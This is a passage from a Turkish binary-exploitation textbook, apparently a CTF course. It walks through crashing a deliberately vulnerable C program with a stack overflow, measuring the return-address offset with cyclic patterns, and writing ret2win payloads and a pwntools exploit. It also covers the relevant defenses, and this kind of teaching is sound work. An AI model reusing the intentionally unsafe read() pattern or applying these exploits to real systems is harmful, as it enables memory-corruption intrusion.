# Bölüm 09: Dönüş adresini ezmek

## Bu bölümde

Önceki bölümde bir değişkeni değiştirdik. Bu bölümde çok daha güçlü bir şey yapacağız: programın **nereye gideceğini** değiştireceğiz. Ama aceleye gerek yok. Önce programı bilerek çökertip çöküşü bir olay yeri incelemesi gibi okuyacağız. pwndbg'nin çökme ekranını satır satır okuyabildiğin gün, exploit yazmanın en zor kısmını geride bırakmış olursun.

**Ön koşullar:** Bölüm 5 (çerçeve şekli, `X + 8` kuralı), Bölüm 6 (pwndbg ekranı), Bölüm 8 (payload göndermek).

**Bu bölümün sonunda:**

- Bir programı taşmayla çökertip çıkış kodundan hangi sinyalle öldüğünü söyleyebileceksin.
- pwndbg'nin çökme ekranındaki dört paneli okuyup dönüş adresinin üstüne neyin yazıldığını gösterebileceksin.
- `cyclic` deseniyle dönüş adresine olan mesafeyi bulup bunu assembly'den ve adreslerden iki ayrı yolla doğrulayabileceksin.
- Geçersiz (non-canonical) bir adresin neden `ret` komutunun kendisinde çöktüğünü açıklayabileceksin.

## Sezgi: sahte not

Bölüm 5'teki tabak yığınını hatırla. `call`, tabakların arasına "işim bitince buraya döneceğim" yazan bir not bırakıyordu. Şimdi biri, buffer'a fazla veri yazarak o notun üstüne kendi notunu yapıştırıyor. Fonksiyon işini bitirince notu okuyor ve hiç düşünmeden oraya gidiyor. Notun gerçek olup olmadığını kontrol etmesinin hiçbir yolu yok.

Benzetmenin bozulduğu yer: gerçek hayatta saçma bir not ("Mars'a git") görsen gitmezsin. İşlemci ise gitmeye çalışır. Adres gerçekten saçmaysa, gitmeye çalışırken kendini kapatır. Bu bölümün ilk yarısı tam olarak bu çöküşü inceliyor.

## Hedef

```c
/* e02_win: donus adresini ezip win()'e zipla (ret2win). Koruma yok. */
#include <stdio.h>
#include <unistd.h>

void win(void)
{
    puts("tebrikler: win() calisti!");
    _exit(0);
}

void vuln(void)
{
    char buf[32];
    printf("girdi: ");
    read(0, buf, 200);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("normal cikis.");
    return 0;
}
```

`win` fonksiyonu var ama hiçbir yerden çağrılmıyor. CTF'lerde bu tür fonksiyonlara genelde `win`, `flag`, `shell` gibi isimler verilir. Bizim işimiz programı oraya götürmek. Hata yine tanıdık: `buf` 32 bayt, `read` 200 bayta kadar okuyor. Derleme ayarları `e01_admin` ile aynı.

## Normal ve taşmış

Kısa bir girdiyle her şey yolunda:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20)' | ~/cracks/e02_win; echo; echo "\$? = $?"
```

```text
girdi: normal cikis.

$? = 0
```

`$?` kabuğun son komutun çıkış kodunu tuttuğu değişken. `0` "sorun yok" demek.

Şimdi 60 bayt:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*60)' | ~/cracks/e02_win; echo "\$? = $?"
```

```text
girdi: $? = 139
```

`normal cikis.` yok, çıkış kodu 139. Kabuk, bir sinyalle ölen programlar için `128 + sinyal numarası` döndürür. 139 − 128 = 11, yani **SIGSEGV**: "program geçersiz bir bellek erişimi yaptı". Etkileşimli bir terminalde ayrıca `segmentation fault` yazısını görürsün.

| Çıkış kodu | Sinyal | Kitapta ne zaman |
|---|---|---|
| 139 | SIGSEGV (11) | Geçersiz adres, çalıştırılamayan bellek (Bölüm 9, 12) |
| 134 | SIGABRT (6) | Program kendini öldürdü: canary, FORTIFY (Bölüm 7, 17) |
| 132 | SIGILL (4) | Geçersiz komut, genelde bir komutun ortasına zıplamak |

## Çöküşü incelemek

Tahminimiz: `ret`, yığından `AAAAAAAA`'yı aldı ve `rip`'i `0x4141414141414141` yapmaya çalıştı. Ama 60 tane aynı harf, **hangi** sekiz baytın dönüş adresine düştüğünü söylemez. Bunun için `A` yerine bir desen göndereceğiz.

### Desen nedir

`cyclic` hiçbir 8 baytlık parçası tekrarlanmayan bir bayt dizisi üretir:

```bash
python3 -c "from pwn import *; print(cyclic(48, n=8))"
```

```text
b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaa'
```

`aaaaaaaa`, `baaaaaaa`, `caaaaaaa`... Her 8'lik parça benzersiz. Çökmeden sonra dönüş adresinin yerinde hangi 8'liyi görürsek, desenin kaçıncı baytına denk geldiğini kesin olarak biliriz. Bu desenlere matematikte **De Bruijn dizisi** denir.

### Desenle çökert

```bash
python3 -c 'import sys; from pwn import cyclic; sys.stdout.buffer.write(cyclic(100, n=8))' > /tmp/cyc
pwndbg -q ~/cracks/e02_win
r < /tmp/cyc
```

Program çöker ve pwndbg aşağıdaki ekranı basar. Bu bölümün en önemli çıktısı bu. Acele etmeden, panel panel okuyacağız:

```text
Program received signal SIGSEGV, Segmentation fault.
0x00000000004011b7 in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
*RAX  0x64
*RBX  0x7fffffffd588 —▸ 0x7fffffffda31 ◂— '/home/linkola/cracks/e02_win'
*RCX  0x7ffff7f955c0 (_IO_2_1_stdout_) ◂— 0xfbad2887
*RDX  0x64
 RDI  0
*RSI  0x7fffffffd440 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0
 R9   0
 R10  0
*R11  0x202
 R12  0
*R13  0x7fffffffd598 —▸ 0x7fffffffda4e ◂— 'MAIL=/var/mail/linkola'
*R14  0x7ffff7ffd000 (_rtld_local) —▸ 0x7ffff7ffe310 ◂— 0
*R15  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401130 ◂— endbr64
*RBP  0x6161616161616165 ('eaaaaaaa')
*RSP  0x7fffffffd468 ◂— 0x6161616161616166 ('faaaaaaa')
*RIP  0x4011b7 (vuln+52) ◂— ret
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
   0x4011b0 <vuln+45>    call   read@plt                    <read@plt>
   0x4011b5 <vuln+50>    nop
   0x4011b6 <vuln+51>    leave
 ► 0x4011b7 <vuln+52>    ret                                <0x6161616161616166>
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp 0x7fffffffd468 ◂— 0x6161616161616166 ('faaaaaaa')
01:0008│     0x7fffffffd470 ◂— 0x6161616161616167 ('gaaaaaaa')
02:0010│     0x7fffffffd478 ◂— 0x6161616161616168 ('haaaaaaa')
03:0018│     0x7fffffffd480 ◂— 0x6161616161616169 ('iaaaaaaa')
04:0020│     0x7fffffffd488 ◂— 0x616161616161616a ('jaaaaaaa')
05:0028│     0x7fffffffd490 ◂— 0x616161616161616b ('kaaaaaaa')
06:0030│     0x7fffffffd498 ◂— 0x616161616161616c ('laaaaaaa')
07:0038│     0x7fffffffd4a0 ◂— 0x7fff6161616d
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► 0 0x4011b7           vuln+52
   1 0x6161616161616166
   2 0x6161616161616167
────────────────────────────────[ LAST SIGNAL ]─────────────────────────────────
Program received signal SIGSEGV (fault address: 0x0).
```

### İlk iki satır: olay yeri

`0x00000000004011b7 in vuln ()`. Program `vuln`'deki `0x4011b7` adresinde öldü. Bölüm 5'ten tanıyorsun: bu, `vuln`'ün son komutu, `ret`.

Şuna dikkat et: çöken komut `ret`'in **kendisi**. Program `0x6161616161616166` adresine gidip orada ölmedi. `ret` daha zıplayamadan hata verdi. Neden?

x86-64'te adresler 64 bit gibi görünür, ama işlemci bunların sadece alt 48 bitini gerçekten kullanır. Üstteki 16 bitin, 47. bitin kopyası olması gerekir: ya hepsi 0 ya da hepsi 1. Bu kurala uyan adreslere **kanonik (canonical)**, uymayanlara kanonik olmayan adres denir. `0x6161616161616166`'nın üst iki baytı `61 61`, kurala uymuyor. İşlemci `rip`'e böyle bir değerin konmasını `ret` aşamasında reddeder ve genel bir koruma hatası (general protection fault) üretir. Linux bunu SIGSEGV olarak iletir. Panelin en altındaki `fault address: 0x0` da bu yüzden anlamsız görünüyor: bu tür hatada çekirdek gerçek bir hata adresi raporlamıyor.

> [!TIP]
> **Pratikteki anlamı:** Dönüş adresine `AAAAAAAA` yazarsan program `ret`'te çöker. Geçerli ama yanlış bir adres yazarsan (örneğin `0x0000000000414141`), `ret` çalışır, program o adrese zıplar ve **orada** çöker. İkisi ekranda farklı görünür, ama ikisi de aynı şeyi söyler: dönüş adresi sende.

### REGISTERS paneli

| Yazmaç | Değer | Ne anlatıyor |
|---|---|---|
| `RAX` | `0x64` | `read`'in dönüş değeri. 100 baytın hepsi okunmuş. |
| `RSI` | `0x7fffffffd440 ◂— 'aaaaaaaa'` | `read`'in 2. argümanı, yani buffer. Hâlâ duruyor ve gösterdiği yerde desenin başı var. **Buffer `0x7fffffffd440`'ta başlıyor.** |
| `RBP` | `0x6161616161616165` (`eaaaaaaa`) | `leave`, kaydedilmiş rbp'yi yığından aldı. Ama o 8 baytın üstüne biz yazmıştık: desenin 5. parçası. |
| `RSP` | `0x7fffffffd468 ◂— 'faaaaaaa'` | `ret`'in alacağı 8 bayt. Desenin 6. parçası. **Dönüş adresinin yerine `faaaaaaa` yazılmış.** |
| `RBX`, `R13` | `argv`, ortam değişkenleri | Bu programla ilgisi yok. |

### DISASM paneli

`►` sıradaki komutu gösteriyor: `ret`. pwndbg yanına nereye döneceğini de yazmış: `<0x6161616161616166>`.

### STACK paneli

Yığının tepesinden itibaren desenin `f`, `g`, `h`... parçaları sırayla duruyor. 100 baytın sonu `m` parçasının ortasına denk geliyor. Son satırdaki `0x7fff6161616d` bu yüzden yarım: üst baytlarda, oradan önceden kalmış bir değerin baytları duruyor.

### BACKTRACE paneli

Normalde burada `vuln` → `main` → libc zinciri olurdu. pwndbg zinciri kurmak için yığındaki dönüş adreslerini takip ediyor, ama yığın artık bizim desenimizle dolu. O yüzden `0x6161616161616166`, `0x6161616161616167`... görüyoruz.

## Mesafeyi bul

Dönüş adresinin yerinde `0x6161616161616166` vardı. Desende kaçıncı bayt?

```bash
cyclic -n 8 -l 0x6161616161616166
```

```text
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

**Mesafe 40.** pwndbg değeri little-endian'dan çevirip baytlara dönüştürdü (`faaaaaaa`) ve desende aradı.

Şimdi bunu iki bağımsız yoldan sağlayalım:

1. **Assembly'den:** `vuln`'de buffer `[rbp-0x20]`. Bölüm 5'in kuralı: `0x20 + 8 = 40`. ✓
2. **Adreslerden:** dönüş adresinin yeri `rsp` = `0x7fffffffd468`, buffer `rsi` = `0x7fffffffd440`. Fark `0x28` = 40. ✓

Üç yöntem, aynı sonuç. Bunu kural edin: **mesafeyi her zaman en az iki yoldan doğrula.** Biri yanlışsa diğeri seni kurtarır.

## Neden desen?

Mesafeyi assembly'den bulabiliyorsak desene ne gerek var? Çünkü assembly bazen yalan söylemez ama eksik söyler:

- `-O2` ile derlenmiş kodda `rbp` kullanılmayabilir, hesabı yapmak zorlaşır.
- Buffer ile dönüş adresi arasında derleyicinin eklediği dolgular ya da başka değişkenler olabilir.
- Girdi, buffer'a yazılmadan önce bir dönüşümden geçiyor olabilir (örneğin büyük harfe çevriliyor).

Desen varsayım yapmaz. Programın gerçekte ne yaptığını ölçer.

## Savunma tarafı

Bu bölümdeki çöküşü üç koruma farklı şekillerde engeller:

- **Canary** (Bölüm 17): dönüş adresinden önce rastgele bir değer koyar. Aynı payload, canary açık derlenmiş `e02_win`'de şöyle biter: `*** stack smashing detected ***: terminated`, çıkış kodu 134. Program `ret`'e hiç ulaşmaz.
- **FORTIFY_SOURCE**: `read`'in buffer'dan büyük okumasını çalışma anında yakalar (Bölüm 7).
- **Kanonik adres kuralı** bir savunma değil, ama ilginç bir yan etkisi var: dönüş adresine tamamen rastgele bir 8 bayt yazmak neredeyse her zaman `ret`'te çökmeyle sonuçlanır. Saldırganın yazdığı adresin geçerli, yani üst iki baytının sıfır olması gerekir. Bölüm 8'deki `strcpy` sorunu da buradan geliyor.

> [!WARNING]
> **Sık yapılan hatalar**
>
> - **`cyclic -l`'e 4 bayt vermek.** 64 bitte desen 8'lik parçalardan oluşur: `-n 8` kullan ve `RSP`'deki 8 baytın tamamını ver.
> - **Desen yerine `RIP`'e bakmak.** Kanonik olmayan adreslerde `RIP` hâlâ `ret`'i gösterir. Bakman gereken yer `[rsp]`.
> - **Çöküşün `ret`'te olmasını exploit'in başarısız olduğu sanmak.** Tam tersine: `ret`'te çöküş, dönüş adresinin kontrolünün sende olduğunu gösterir.

## Kontrol soruları

1. Çıkış kodu 139 ne anlama gelir?
2. Dönüş adresine `0x4141414141414141` yazınca program neden `ret`'in kendisinde çöker?
3. Çökme ekranında dönüş adresine ne yazıldığını hangi satırdan okursun?
4. `RSI` buffer'ın adresini neden hâlâ gösteriyor?
5. `cyclic -l` 40 dedi. Bunu başka hangi iki yoldan doğrularsın?
6. Dönüş adresine `0x0000000000414141` yazarsan program nerede çöker?

## Alıştırmalar

1. **Gözlemle.** `e04_rop` için desenle mesafeyi bul. `objdump`'tan bulduğun sayıyla karşılaştır.
2. **Tahmin et, sonra dene.** `e03_shell`'in buffer'ı `0x80` bayt. `cyclic 100` yeterli mi? Önce cevabını yaz, sonra dene. Yetmezse ne görürsün?
3. **Kendin yap.** Dönüş adresine `0x0000000000414141` yazan bir payload gönder. pwndbg hangi adreste çöktüğünü söylüyor? `RIP` ne gösteriyor?

## Özet

- Taşma dönüş adresine ulaşırsa program `ret`'te kontrolü kaybeder. Çıkış kodu 139 = SIGSEGV.
- Kanonik olmayan bir adres `ret`'in kendisinde çöker. Geçerli ama yanlış bir adres, zıplanan yerde çöker.
- Çökme ekranında dönüş adresini `RSP` satırından, buffer'ı genelde `RSI`'den okursun.
- `cyclic` + `cyclic -l` mesafeyi ölçer. Assembly ve adres farkıyla doğrula.
- Canary bu çöküşü `stack smashing detected` ile önler.

Mesafe 40, dönüş adresi bizde. Tek eksik, oraya ne yazacağımız.

---
**Kontrol sorularının cevapları**

1. Program 11 numaralı sinyalle, SIGSEGV ile öldü (139 = 128 + 11).
2. Adresin üst baytları sıfır değil, yani kanonik değil. İşlemci bu değeri `rip`'e koymayı reddeder.
3. `RSP` satırından: `◂—` işaretinin sağındaki değer, `ret`'in alacağı 8 bayt.
4. `read` dönerken `rsi`'yi değiştirmedi ve `read`'den sonra başka bir şey de `rsi`'ye yazmadı.
5. Assembly'den (`[rbp-0x20]` → `0x20 + 8`) ve adres farkından (`rsp − rsi`).
6. `ret` çalışır, `rip` = `0x414141` olur. Bu adreste bellek eşlenmemiş, program orada çöker.

**Bu bölümde geçen yeni terimler:** SIGSEGV, SIGABRT, çıkış kodu, desen (cyclic, De Bruijn), kanonik adres.


# Bölüm 10: ret2win: başka bir fonksiyona zıplamak

## Bu bölümde

Mesafeyi biliyoruz: 40. Dönüş adresine ne yazacağımızı da biliyoruz: `win`'in adresi. Bu bölümde iki bilgiyi birleştirip programın akışını gerçekten değiştireceğiz. Sonra aynı şeyi gdb'de adım adım izleyip, yazdığın payload'ın yığında nasıl yürüdüğünü göreceksin. Bölümün sonunda Bölüm 15'te başımıza gelecek bir sorunu, yığın hizalamasını, şimdiden tanıyacağız.

**Ön koşullar:** Bölüm 9.

**Bu bölümün sonunda:**

- `nm` ile bir fonksiyonun adresini bulup ret2win payload'ı hazırlayabileceksin.
- Exploit'in çalışmasını `leave` ve `ret` adımlarında yazmaç değerleriyle açıklayabileceksin.
- Aynı exploit'i pwntools ile, adresi elle yazmadan kurabileceksin.
- Bir fonksiyonun başına değil ortasına zıplamanın ne zaman işe yaradığını söyleyebileceksin.

## Adres

```bash
nm ~/cracks/e02_win | grep win
```

```text
0000000000401166 T win
```

PIE kapalı, yani bu adres her çalıştırmada aynı: `0x401166`.

## Payload

```text
 0                                       40                         48
 ┌───────────────────────────────────────┬──────────────────────────┐
 │ A A A A ... (40 bayt dolgu)           │ 66 11 40 00 00 00 00 00  │
 └───────────────────────────────────────┴──────────────────────────┘
   buf (32) + kaydedilmiş rbp (8)          dönüş adresi = win
```

## Deneme sürüşü

```bash
python3 -c 'import sys; from pwn import p64; sys.stdout.buffer.write(b"A"*40 + p64(0x401166))' | ~/cracks/e02_win; echo "\$? = $?"
```

```text
girdi: tebrikler: win() calisti!
$? = 0
```

İşte bu. `vuln` dönerken `main`'e değil `win`'e gitti. Kaynak kodda hiçbir satırın çağırmadığı bir fonksiyon çalıştı.

## Ne oldu: gerçek değerlerle

Bölüm 5'teki adım tablosunu hatırlarsan, aynı programı bu payload'la da çalıştırıp son adımları kaydetmiştik:

| Adım | Çalışan komut | `rsp` | `rbp` | `rip` | `[rsp]` |
|---|---|---|---|---|---|
| 5 | (`read` bitti) | `…d410` | `…d430` | `0x4011b6` | `0x4141414141414141` |
| 6 | `leave` | `…d438` | **`0x4141414141414141`** | `0x4011b7` | **`0x401166`** |
| 7 | `ret` | `…d440` | `0x4141414141414141` | **`0x401166`** | `0x1` |

1. `read` 48 bayt yazdı: 32'si `buf`'a, 8'i kaydedilmiş rbp'ye, 8'i dönüş adresine.
2. `leave` önce `rsp`'yi `rbp`'ye eşitledi, sonra `pop rbp` ile kaydedilmiş rbp'nin yerindeki `AAAAAAAA`'yı `rbp`'ye aldı. `rbp` artık çöp, ama `win` `rbp`'yi okumadan kendi çerçevesini kurduğu için sorun olmuyor.
3. `ret` yığının tepesinde `0x401166`'yı buldu ve `rip`'e koydu.
4. İşlemci `win`'i çalıştırdı: mesajı yazdı, `_exit(0)` ile programı kapattı.

`_exit(0)` önemli bir ayrıntı. `win` normal bir `ret` ile bitseydi, yığında dönüş adresi olarak `0x1` gibi anlamsız bir değer bulacak ve büyük ihtimalle çökecekti. Gerçek exploit'lerde iş bittikten sonra programın çökmesi genelde umursanmaz, önemli olan işin yapılmış olması. Ama temiz bir çıkış, uzaktaki bir sunucuya saldırırken servisi çökertmemek için önemli olabilir.

## gdb'de kendin izle

Yukarıdaki tabloyu kendi ekranında üret:

```bash
python3 -c 'import sys; from pwn import p64; sys.stdout.buffer.write(b"A"*40 + p64(0x401166))' > /tmp/pay
pwndbg -q ~/cracks/e02_win
b *vuln+52
r < /tmp/pay
x/gx $rsp
si
```

`b *vuln+52` seni `ret`'in önünde durdurur. `x/gx $rsp`, `ret`'in alacağı değeri gösterir: `0x401166`. `si` ile tek adım atınca DISASM panelinde `win`'in ilk komutunu (`push rbp`) görürsün. Bu anı bir kere kendi gözünle görmek, okumaktan çok daha kalıcıdır.

## pwntools ile

Bu dosya `~/.cracks_src/e02_win_x.py` olarak duruyor:

```python
from pwn import *

e = ELF("/home/linkola/cracks/e02_win")
p = process(e.path)

payload  = b"A" * 40          # buf + kaydedilmiş rbp
payload += p64(e.sym.win)     # dönüş adresi

p.sendafter(b"girdi: ", payload)
print(p.recvall())
```

```text
b'tebrikler: win() calisti!\n'
```

`e.sym.win` adresi senin yerine dosyadan okur. Program yeniden derlenip `win`'in adresi değişse de exploit çalışmaya devam eder. Adresleri elle yazmak yerine `ELF` nesnesinden almayı alışkanlık yap.

## Fonksiyonun ortasına zıplamak

Dönüş adresine fonksiyonun başını yazmak zorunda değilsin. Ortasındaki herhangi bir komutun adresi de olur. `win`'in ilk komutu 1 baytlık `push rbp`. Onu atlayıp `0x401167`'ye zıplayalım:

```bash
python3 -c 'import sys; from pwn import p64; sys.stdout.buffer.write(b"A"*40 + p64(0x401167))' | ~/cracks/e02_win
```

```text
girdi: tebrikler: win() calisti!
```

Yine çalıştı. Bu küçük hile ileride işine yarayacak. Bazen bir fonksiyona tam başından girildiğinde yığın 8 bayt kaymış olur ve fonksiyonun içindeki bir komut çöker. `push rbp`'yi atlamak `rsp`'yi 8 bayt farklı bırakır ve bu kaymayı düzeltir.

> [!NOTE]
> **Neden olur:** x86-64'ün kuralına göre bir `call` komutundan hemen önce `rsp` 16'nın katı olmalı. Buna **yığın hizalaması** denir. Bazı komutlar, özellikle 16 baytı tek seferde taşıyan `movaps`, hizalanmamış bellekte çöker. Biz bir fonksiyona `call` ile değil `ret` ile girdiğimizde bu kural bozulabilir. `puts` bu komutu kullanmadığı için burada sorun çıkmadı. Bölüm 15'te `system` kullanacak ve gerçekten çökeceğiz.

Bir komutun **ortasına** zıplamak ise genelde iyi bir fikir değildir. İşlemci baytları baştan okumaya başlar ve bambaşka komutlar görür, sonuç genelde SIGILL (çıkış kodu 132) olur. Bölüm 12'de bu "bambaşka komutlar"ın bazen çok işe yaradığını göreceksin.

## Binary Ninja'da

`vuln`'e HLIL görünümünde bak: `read(0, &var_28, 0xc8)`. Değişkenin adı `var_28`, yani dönüş adresine mesafe `0x28` = 40. Desenle bulduğumuz sayıyla aynı.

`win`'i bulmak için sol taraftaki fonksiyon listesine bakman yeter. Gerçek görevlerde bu fonksiyon `win` diye adlandırılmamış olabilir, program sembollerinden de arındırılmış (stripped) olabilir. O zaman `system`, `execve` çağıran ya da `flag.txt` gibi bir metne başvuran fonksiyonları ara. Strings panelinde bir metnin üstünde `x`'e basınca onu kullanan kod listelenir.

## Savunma tarafı

ret2win'in çalışması için iki şey gerekti: dönüş adresine yazabilmek ve `win`'in adresini bilmek. Savunmalar ikisini de hedef alır:

- **Canary**, dönüş adresine yazmayı fark eder. Bu payload, `-fstack-protector-strong` ile derlenmiş `e02_win`'de `*** stack smashing detected ***` ile biter (bu makinede denendi).
- **PIE**, `win`'in adresini her çalıştırmada değiştirir. `0x401166` işe yaramaz hale gelir (Bölüm 18).
- **Gölge yığın (CET shadow stack)** destekleyen donanımda ve işletim sisteminde, `ret` dönüş adresini korumalı bir kopyayla karşılaştırır ve uyuşmazsa programı öldürür.

> [!WARNING]
> **Sık yapılan hatalar**
>
> - **`win`'in adresini `p32` ile paketlemek.** 64 bitte dönüş adresi 8 bayt. `p64`.
> - **Dolguyu 32 yapmak.** Kaydedilmiş rbp'yi unutma: 40.
> - **`win` çalıştıktan sonra programın çökmesini başarısızlık sanmak.** Mesaj geldiyse exploit çalışmıştır.
> - **PIE'li bir programda `nm`'in verdiği adresi doğrudan kullanmak.** PIE açıkken `nm` taban adresi değil, uzaklığı gösterir (Bölüm 18).

## Kontrol soruları

1. ret2win payload'ının iki parçası nedir, her birinin uzunluğu kaç?
2. Exploit sonrası `rbp` neden `0x4141414141414141` oldu?
3. `win` bir `ret` ile bitseydi ne olurdu?
4. `0x401167`'ye zıplamak neden işe yaradı?
5. Bir komutun ortasına zıplamak genelde neden çöker?
6. `e.sym.win` kullanmanın, adresi elle yazmaya göre avantajı ne?

## Alıştırmalar

1. **Gözlemle.** "gdb'de kendin izle" adımlarını uygula. `si`'den sonra `p/x $rsp` değerini not et. Bu değer 16'nın katı mı?
2. **Tahmin et, sonra dene.** Dönüş adresine `win`'in **sonundaki** `call _exit` komutunun adresini yaz (`objdump` ile bul). Mesaj yazılır mı? Program nasıl biter?
3. **Kendin yap.** `e01_admin`'de de `read` dönüş adresine kadar uzanıyordu. `e01_admin`'in dönüş adresini `main`'in içindeki `puts("hos geldin admin!")` satırına çevir (`objdump`'ta `lea rax,[rip+0xe44]` satırı). `admin`'e doğru değeri yazmadan "hos geldin admin!" yazdır. Program mesajdan sonra neden çöküyor?
4. **Merdiven.** p02 ret2win için hazırlanacak. Bu bölümdeki adımlar aynen geçerli olacak.

## Özet

- ret2win: dolgu (buffer + kaydedilmiş rbp) + hedef fonksiyonun adresi.
- `leave` kaydedilmiş rbp'yi, `ret` dönüş adresini yığından alır. İkisinin yerine de biz yazmıştık.
- `ELF(...).sym.isim` adresleri elle yazmaktan kurtarır.
- Bir fonksiyonun ortasındaki bir komuta da zıplanabilir. `push rbp`'yi atlamak hizalamayı 8 bayt kaydırır.
- Savunmalar: canary, PIE, gölge yığın.

Bu programda işimize yarayacak bir `win` fonksiyonu vardı. Ya olmasaydı? Bir sonraki bölümde kodu kendimiz getireceğiz.

---
**Kontrol sorularının cevapları**

1. 40 baytlık dolgu (32 buffer + 8 kaydedilmiş rbp) ve 8 baytlık `win` adresi.
2. `leave` içindeki `pop rbp`, kaydedilmiş rbp'nin yerinden okudu. O 8 baytın üstüne `AAAAAAAA` yazmıştık.
3. Yığının tepesindeki değeri (`0x1`) dönüş adresi sanıp oraya zıplamaya çalışır ve çökerdi.
4. `0x401167`, `win`'in ikinci komutunun (`mov rbp,rsp`) başlangıcı. Geçerli bir komut sınırı.
5. İşlemci baytları zıpladığı yerden itibaren yorumlar. Bir komutun ortası genelde anlamsız ya da geçersiz bir komut olarak okunur.
6. Program yeniden derlenip adres değişirse exploit kendini otomatik olarak uyarlar.

**Bu bölümde geçen yeni terimler:** ret2win, yığın hizalaması, `movaps`, SIGILL.

---

[← 04-ilk-tasma-ve-girdi](04-ilk-tasma-ve-girdi.md) · [İçindekiler](README.md) · [06-shellcode →](06-shellcode.md)
